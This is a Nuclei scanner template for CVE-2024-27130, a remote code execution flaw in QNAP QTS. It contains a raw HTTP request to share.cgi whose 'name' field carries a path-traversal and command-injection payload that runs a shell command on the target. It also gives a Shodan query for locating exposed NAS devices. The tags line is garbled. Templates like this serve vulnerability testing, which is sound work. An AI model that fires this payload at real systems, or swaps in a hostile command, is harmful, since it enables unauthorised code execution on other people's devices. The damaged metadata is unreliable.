id: CVE-2024-27130

info:
  name: QNAP QuTSCloud - Remote Code Execution
  author: colcs25
  severity: high
  description: |
    A buffer copy without checking size of input vulnerability has been reported to affect several QNAP operating system versions. If exploited, the vulnerability could allow users to execute code via a network. We have already fixed the vulnerability in the following version: QTS 5.1.7.2770 build 20240520 and later QuTS hero h5.1.7.2770 build 20240520 and later
  remediation: Fixed in QTS 5.1.7.2770 build 20240520
  reference:
    - https://github.com/watchtowrlabs/CVE-2024-27130
    - https://labs.watchtowr.com/qnap-qts-qnapping-at-the-wheel-cve-2024-27130-and-friends/
    - https://nvd.nist.gov/vuln/detail/CVE-2024-27130
  classification:
    cve-id: CVE-2024-27130
    cvss-score: 8.8
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
    cwe-id: CWE-120
    cpe: cpe:2.3:o:qnap:qts:5.1.6.2722:build_20240402:*:*:*:*:*:*
  metadata:
#    verified: true
    max-request: 1
    product: qts
    vendor: qnap
    shodan-query: ssl.cert.issuer.cn:"QNAP NAS",title:"QNAP Turbo NAS"
  tags: cve,cve2024,qnap,qts,quts,rce,intrusivenuc  -t
     
http:
  - raw:
      - |
        POST /cgi-bin/filemanager/share.cgi HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        ssid={{ssid}}&func=get_file_size&total=1&path=/&name={{payload}}

    payloads:
      payload:
        - "/../../../../bin/echo noot noot > /tmp/watchtowr #"

    matchers-condition: and
    matchers:
      - type: word
        part: header
        words: 
          - "HTTP/1.1 200 OK"

      - type: status
        status:
          - 200

    extractors:
      - type: regex
        part: body
        regex:
          - "watchtowr"
